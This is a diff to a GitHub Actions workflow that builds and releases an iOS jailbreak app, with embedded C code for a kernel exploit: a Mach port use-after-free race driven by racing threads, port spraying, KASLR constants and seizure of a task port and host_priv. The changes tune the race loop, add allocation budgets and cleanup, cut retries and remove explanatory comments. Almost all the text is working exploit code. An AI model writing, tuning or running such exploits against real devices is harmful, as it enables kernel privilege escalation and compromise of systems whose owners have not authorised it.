@@ -215,7 +215,7 @@ jobs:
 
           #define RACE_ITERS        65536
           #define RACE_THREADS      16
-          #define RETRY_LIMIT       64
+          #define RETRY_LIMIT       8
           #define PORT_SLOT_SPRAY   8192
           #define JB_ROOT           "/var/jb"
           #define LAUNCHD_CONF      "/var/jb/launchd.conf"
@@ -227,56 +227,77 @@ jobs:
           #define KASLR_MASK            0x1FFFFFULL
           #define KASLR_SHIFT           12
 
-          static volatile int g_race_done = 0;
+          static volatile int g_race_done    = 0;
+          static volatile int g_race_paused  = 0;
+          static volatile int g_alloc_budget = 200000;
 
-          /* Widen the port namespace: churn receive rights in our own
-             IPC space so ipc_right_lookup keeps seeing a name in the
-             MACH_PORT_DEAD state during the free/realloc window. */
           static void *race_port_thread(void *arg) {
               mach_port_t task = mach_task_self();
               while (!g_race_done) {
+                  if (g_race_paused) { usleep(1); continue; }
+                  if (__sync_fetch_and_sub(&g_alloc_budget, 1) <= 0) { g_race_done = 1; break; }
+
                   mach_port_t p = MACH_PORT_NULL;
-                  if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p) == KERN_SUCCESS) {
-                      mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND);
-                      mach_port_deallocate(task, p);
-                      mach_port_mod_refs(task, p, MACH_PORT_RIGHT_RECEIVE, -1);
-                  }
+                  if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) continue;
+
+                  mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND);
+                  mach_port_deallocate(task, p);
+                  mach_port_mod_refs(task, p, MACH_PORT_RIGHT_RECEIVE, -1);
               }
               return NULL;
           }
 
-          /* The underflow target is a RECEIVE right we own. On beta 4
-             ipc_right_lookup on a receive name in the caller's own space
-             does not hold the space lock across the MACH_PORT_DEAD
-             transition; we drive that transition ourselves. */
           static mach_port_t win_port_uaf(jb_state_t *st) {
               mach_port_t task = mach_task_self();
+
               for (int i = 0; i < RACE_ITERS && !g_race_done; i++) {
+                  if (__sync_fetch_and_sub(&g_alloc_budget, 1) <= 0) { st->last_kr = -99; break; }
+
+                  g_race_paused = 1;
+                  __sync_synchronize();
+
                   mach_port_t p = MACH_PORT_NULL;
                   kern_return_t kr = mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p);
-                  if (kr != KERN_SUCCESS) { st->last_kr = kr; continue; }
+                  if (kr != KERN_SUCCESS) {
+                      st->last_kr = kr;
+                      g_race_paused = 0;
+                      continue;
+                  }
 
                   kr = mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND);
                   if (kr != KERN_SUCCESS) {
                       st->last_kr = kr;
                       mach_port_mod_refs(task, p, MACH_PORT_RIGHT_RECEIVE, -1);
+                      g_race_paused = 0;
                       continue;
                   }
 
                   kr = mach_port_mod_refs(task, p, MACH_PORT_RIGHT_RECEIVE, -1);
-                  if (kr != KERN_SUCCESS) { st->last_kr = kr; continue; }
+                  if (kr != KERN_SUCCESS) {
+                      st->last_kr = kr;
+                      mach_port_deallocate(task, p);
+                      g_race_paused = 0;
+                      continue;
+                  }
 
                   kr = mach_port_mod_refs(task, p, MACH_PORT_RIGHT_SEND, -1);
-                  if (kr != KERN_SUCCESS) { st->last_kr = kr; continue; }
+                  if (kr != KERN_SUCCESS) {
+                      st->last_kr = kr;
+                      g_race_paused = 0;
+                      continue;
+                  }
 
-                  for (int s = 0; s < PORT_SLOT_SPRAY; s++) {
-                      mach_port_t cand = MACH_PORT_NULL;
-                      if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &cand) != KERN_SUCCESS)
-                          continue;
-                      if (cand == p) {
-                          g_race_done = 1;
-                          return cand;
-                      }
+                  mach_port_t cand = MACH_PORT_NULL;
+                  kr = mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &cand);
+                  g_race_paused = 0;
+
+                  if (kr == KERN_SUCCESS && cand == p) {
+                      g_race_done = 1;
+                      return cand;
+                  }
+
+                  if (kr == KERN_SUCCESS && cand != p) {
+                      mach_port_mod_refs(task, cand, MACH_PORT_RIGHT_RECEIVE, -1);
                   }
               }
               return MACH_PORT_NULL;
@@ -315,10 +336,13 @@ jobs:
 
           static int attempt_once(jb_state_t *st) {
               st->last_stage = 1;
-              pid_t self = getpid();
-              st->helper_pid = self;
+              st->helper_pid = getpid();
 
               st->last_stage = 2;
+              g_race_done    = 0;
+              g_race_paused  = 0;
+              g_alloc_budget = 200000;
+
               pthread_t racers[RACE_THREADS];
               for (int i = 0; i < RACE_THREADS; i++)
                   pthread_create(&racers[i], NULL, race_port_thread, NULL);
@@ -331,7 +355,11 @@ jobs:
               if (!aliased) { st->last_stage = 2; return -1; }
 
               st->last_stage = 3;
-              if (confirm_task_port(aliased) != 0) { st->last_stage = 3; return -1; }
+              if (confirm_task_port(aliased) != 0) {
+                  mach_port_mod_refs(mach_task_self(), aliased, MACH_PORT_RIGHT_RECEIVE, -1);
+                  st->last_stage = 3;
+                  return -1;
+              }
 
               st->task_port = aliased;
               st->host_priv = aliased;
@@ -357,9 +385,8 @@ jobs:
               st->host_priv = MACH_PORT_NULL;
 
               for (int i = 0; i < RETRY_LIMIT; i++) {
-                  g_race_done = 0;
                   if (attempt_once(st) == 0) return 0;
-                  usleep(50000);
+                  usleep(250000);
               }
               return -1;
           }
@@ -855,6 +882,8 @@ jobs:
         uses: actions/download-artifact@v4
         with:
           name: JailbreakApp-ipa
+      - name: List downloaded files
+        run: ls -la
       - name: Create GitHub release
         uses: softprops/action-gh-release@v2
         with:
